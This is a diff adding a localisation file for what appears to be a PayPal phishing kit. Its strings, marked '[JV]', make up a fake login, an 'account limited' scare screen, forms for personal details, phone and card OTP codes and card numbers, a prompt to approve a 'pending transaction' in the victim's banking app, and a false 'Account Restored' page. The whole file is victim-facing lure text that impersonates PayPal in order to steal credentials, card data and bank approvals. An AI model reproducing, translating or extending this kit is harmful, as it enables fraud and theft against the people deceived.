@@ -1,0 +1,117 @@
+{
+    "COMMON": {
+        "NEXT": "[JV] Next",
+        "CONTINUE": "[JV] Continue",
+        "SUBMIT": "[JV] Submit",
+        "CONFIRM": "[JV] Confirm",
+        "VERIFY": "[JV] Verify",
+        "CLOSE": "[JV] Close",
+        "LOADING": "[JV] Loading...",
+        "SECURE_CONNECTION": "[JV] Secure Connection",
+        "COPYRIGHT": "[JV] © 1999-2026 PayPal Inc. All rights reserved.",
+        "PRIVACY": "[JV] Privacy",
+        "LEGAL": "[JV] Legal",
+        "CONTACT": "[JV] Contact",
+        "WORLDWIDE": "[JV] Worldwide"
+    },
+    "SECURITY": {
+        "CHECKING": "[JV] Checking your security...",
+        "VERIFYING": "[JV] Verifying security...",
+        "CONNECTING": "[JV] Connecting..."
+    },
+    "LOGIN": {
+        "TITLE": "[JV] Log in to your PayPal account",
+        "EMAIL_PLACEHOLDER": "[JV] Email or mobile number",
+        "PASSWORD_PLACEHOLDER": "[JV] Password",
+        "FORGOT": "[JV] Forgot password?",
+        "OR": "[JV] or",
+        "SIGN_UP": "[JV] Sign Up",
+        "LOG_IN": "[JV] Log In",
+        "ERROR_CREDENTIALS": "[JV] Check your entries and try again."
+    },
+    "LIMITED": {
+        "TITLE": "[JV] We need to confirm it's you",
+        "DESCRIPTION": "[JV] We noticed a login from a device we don't recognize. To keep your account secure, we just need to verify your identity.",
+        "BUTTON": "[JV] Confirm Identity",
+        "WHY_LINK": "[JV] Why do I need to do this?",
+        "DIALOG_TITLE": "[JV] Why is my account limited?",
+        "ALERT_TITLE": "[JV] Unusual Activity Detected",
+        "ALERT_DESC": "[JV] We noticed a login attempt from a device or location we don't recognize.",
+        "WHATS_LIMITED": "[JV] What's Limited",
+        "LIMIT_1": "[JV] Sending payments",
+        "LIMIT_2": "[JV] Withdrawing funds",
+        "LIMIT_3": "[JV] Removing payment methods",
+        "HOW_TO_RESOLVE": "[JV] How to Resolve",
+        "RESOLVE_DESC": "[JV] This is a temporary security measure. Once you confirm your identity, full account access will be restored immediately.",
+        "SECURE_ACCOUNT": "[JV] Secure Account"
+    },
+    "PERSONAL": {
+        "TITLE": "[JV] Verify your information",
+        "SUBTITLE": "[JV] Please confirm your personal details to help us secure your account.",
+        "ERROR_TITLE": "[JV] Please check your details",
+        "ERROR_DESC": "[JV] Make sure your information matches your legal ID.",
+        "COUNTRY": "[JV] Country of residence",
+        "FIRST_NAME": "[JV] Legal first name",
+        "LAST_NAME": "[JV] Legal last name",
+        "DOB": "[JV] Date of birth",
+        "PHONE": "[JV] Mobile number",
+        "ADDRESS": "[JV] Street address",
+        "CITY": "[JV] City",
+        "ZIP": "[JV] Zip code",
+        "MUST_BE_18": "[JV] Must be 18+"
+    },
+    "PHONE": {
+        "TITLE_INPUT": "[JV] Let's confirm your number",
+        "DESC_INPUT": "[JV] We'll send a code to your mobile to ensure your account is secure.",
+        "TITLE_CODE": "[JV] Enter your code",
+        "DESC_CODE": "[JV] We sent a security code to your mobile device.",
+        "ERROR_TITLE": "[JV] That didn't work",
+        "DISCLAIMER": "[JV] By continuing, you confirm that you are authorized to use this phone number. Standard message and data rates may apply.",
+        "SEND_CODE": "[JV] Send Code",
+        "CHANGE": "[JV] Change",
+        "RESEND": "[JV] Get a new code",
+        "RESEND_WAIT": "[JV] Resend code in {{seconds}}s",
+        "CODE_SENT": "[JV] Code sent!"
+    },
+    "CARD": {
+        "TITLE": "[JV] Link a card",
+        "SUBTITLE": "[JV] Link a card to confirm your identity and lift account limitations.",
+        "ERROR_TITLE": "[JV] Check your card details",
+        "Card Number": "[JV] Card number",
+        "Expiration Date": "[JV] Expiration Date",
+        "Security Code": "[JV] Security Code",
+        "Billing Address": "[JV] Billing Address"
+    },
+    "CARD_OTP": {
+        "BADGE": "[JV] Bank Verification",
+        "TITLE": "[JV] Confirm with your bank",
+        "DESC": "[JV] We've sent a code to the mobile number registered with your card ending in •••• {{last4}}.",
+        "INVALID_TITLE": "[JV] Invalid Code",
+        "INVALID_DESC": "[JV] Please check the code and try again.",
+        "INPUT_LABEL": "[JV] Enter Bank Code",
+        "NO_CODE": "[JV] Didn't receive a code?",
+        "RESEND": "[JV] Resend Code",
+        "RESEND_WAIT": "[JV] Resend available in {{seconds}}s"
+    },
+    "BANK_APP": {
+        "TITLE": "[JV] Confirm it's you",
+        "DESC": "[JV] Please open your banking app on your mobile device and approve the pending transaction to verify your identity.",
+        "WHY_TITLE": "[JV] Why is this needed?",
+        "WHY_DESC": "[JV] Your bank requires strong authentication for this request. Once approved, return here to continue.",
+        "BUTTON": "[JV] I have approved it",
+        "SECURE_VERIFICATION": "[JV] Secure Verification"
+    },
+    "SUCCESS": {
+        "TITLE": "[JV] Account Restored",
+        "BADGE_TITLE": "[JV] Limitation Lifted",
+        "BADGE_DESC": "[JV] Your account access has been fully restored. You can now send, withdraw, and manage your funds securely.",
+        "EMAIL_SENT": "[JV] A confirmation email has been sent to {{email}}.",
+        "BUTTON": "[JV] Return to Dashboard"
+    },
+    "MODAL_LANG": {
+        "TITLE": "[JV] Choose your language",
+        "DESC": "[JV] We detected you are in {{country}}, but your device is set to {{deviceLang}}.",
+        "USE_DEVICE": "[JV] Use {{deviceLang}}",
+        "USE_IP": "[JV] Use {{ipLang}}"
+    }
+}
